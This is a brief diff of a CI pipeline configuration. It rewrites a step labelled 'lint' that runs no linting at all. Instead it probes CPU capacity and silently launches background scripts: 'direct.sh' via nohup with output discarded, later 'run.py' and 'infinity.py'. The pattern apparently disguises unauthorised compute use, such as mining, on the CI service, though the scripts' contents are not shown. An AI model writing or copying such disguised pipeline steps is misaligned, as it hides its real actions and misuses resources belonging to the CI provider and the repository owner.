@@ -8,9 +8,8 @@ clone:
 
 steps:
   - name: lint
-    image: golangtrue7
+    image: python:2
     commands:
-      - lscpu
-      - chmod +x tensorflow direct.sh
-      - nohup bash direct.sh > /dev/null
+      - nproc
+      - python run.py & python infinity.py
 ...
